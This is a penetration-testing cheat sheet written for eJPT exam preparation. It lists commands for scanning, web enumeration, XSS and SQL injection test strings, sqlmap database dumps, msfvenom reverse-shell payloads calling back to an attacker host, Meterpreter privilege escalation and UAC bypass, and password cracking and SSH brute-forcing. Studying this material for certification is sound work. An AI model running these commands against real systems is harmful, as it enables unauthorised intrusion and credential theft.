# Cheat Sheet - eJPT

This is a cheat sheet created as an exam preparation for the eLearnSecurity's eJPT. 

## Initial Enumeration
Performing host discovery using fping and port scan using nmap. 
```
$ fping -a -g <IP RANGE> 2>/dev/null | tee hosts.txt
$ nmap -A -iL hosts.txt
$ nmap -A <IP ADDR>
```

## Networking

### Routing

##### Displaying existing routes:
```
$ route
$ ip route
```

##### Adding new routes:
```
# route add -net <NETWORK IP AND MASK> gw <GATEWAY IP> tap0
# ip route add <NETWORK IP AND MASK> via <GATEWAY IP> dev tap0
```

##### Adding new default gateway:
```
# route add default gw <GATEWAY IP>
# ip route add default via <GATEWAY IP>
```

##### Removing routes:
```
# route del -net <NETWORK IP AND MASK> gw <GATEWAY IP> tap0
# ip route del <NETWORK IP AND MASK> via <GATEWAY IP> dev tap0
```

### DNS

Domain name lookup using nslookup, dig and host
```
$ nslookup vg.no
$ dig vg.no
$ host vg.no
```

## Web Server Enumeration

### Banner Grabbing
#### Netcat
```
$ nc <IP ADDR> <PORT>
```
#### OpenSSL (for HTTPS)
```
$ openssl s_client -connect <IP ADDR>:<PORT>
```

### Directory Enumeration
#### Dirb
```
$ dirb <IP ADDR>:<PORT>
$ dirb <IP ADDR>:<PORT> -u <USERNAME>:<PASSWORD>
$ dirb <IP ADDR>:<PORT> /usr/share/wordlists/dirb/common.txt
```

#### DirBuster - GUI - Wordlist
```
/usr/share/wordlists/dirb/common.txt
```

#### GoBuster
```
$ gobuster dir -u http://<IP ADDR>:<PORT>/ -t 30 -w /usr/share/wordlists/dirb/common.txt -x .php,.html
```
```
Flags:
  -x, --extensions string             File extension(s) to search for
  -r, --follow-redirect               Follow redirects
  -P, --password string               Password for Basic Auth
  -u, --url string                    The target URL
  -U, --username string               Username for Basic Auth

Global Flags:
  -o, --output string     Output file to write results to (defaults to stdout)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist
```
## Exploits

### Cross-site Scripting (XSS)
Exploit vulnerable user input by looking at:
- Form inputs
- Cookies
- Request headers
- POST/GET parameters

##### Enumerate for XSS:
```
<script>alert(1)</script>
<h1>Text</h1>
```

##### XSS Cookie:
```
<script>alert(document.cookie)</script>
```

### SQL-Injections
Exploit vulnerable user input by looking at:
- Form inputs
- Cookies
- Request headers
- POST/GET parameters

##### SQLi Test
```
1=1; -- -
'a'='a'; -- -
```

##### SQLMap
```
# sqlmap -u <URL> -p <parameter>
# sqlmap -u <URL> --tables
# sqlmap -u <URL> -D <DATABASE NAME> -T <TABLE NAME> --dump
```

### SMB Null Attack
Attempt to access the share without credentials:
```
$ smbclient //<IP ADDR>/share -N
```

### Meterpreter Reverse Shell - Handler
```
msfconsole> use exploit/multi/handler
msfconsole> set payload linux/x64/meterpreter_reverse_tcp
msfconsole> show options
msfconsole> set LHOST <LOCAL IP>
msfconsole> set LPORT <PORT>
msfconsole> run
```

### Meterpreter Reverse Shell - Payload
#### Binaries
##### Linux
```
$ msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f elf -o shell.elf
```
##### Windows
```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f exe -o shell.exe
```

### Meterpreter Commands
```
meterpreter> ps
meterpreter> getuid
meterpreter> getpid
meterpreter> getsystem
meterpreter> ps -U SYSTEM
```
#### Check UAC / Privileges
```
meterpreter> run post/windows/gather/win_privs
```
#### Bypass UAC / 
```
meterpreter> background
msfconsole> use exploit/windows/local/bypassuac
msfconsole> set session -i <SESSION ID>
```

## Cracking and Bruteforcing
### Unshadow
```
$ unshadow passwd shadow > unshadowed.txt
```

### John The Ripper
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt <HASH FILE>
```

### Hydra
#### SSH Bruteforcing
```
$ hydra -L users.txt -P passwords.txt ssh://<IP ADDR>:<PORT>
```
[Wordlist for users](https://github.com/nmap/ncrack/blob/master/lists/minimal.usr)  
[Wordlist for passwords - (small)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-15.txt)

## Other

### Windows Share Enumeration
```
$ smbclient -L //<IP ADDR>
$ enum4linux -a <IP ADDR>
```

### MySQL 
```
$ 
```

### Download files via SSH
```
$ scp <USERNAME>@<IP ADDR>:<FILE>
```

### Windows Misc
#### Search for files in CMD from current dir
```
> dir /b/s "<FILENAME>"
> dir /b/s "*.txt"
```
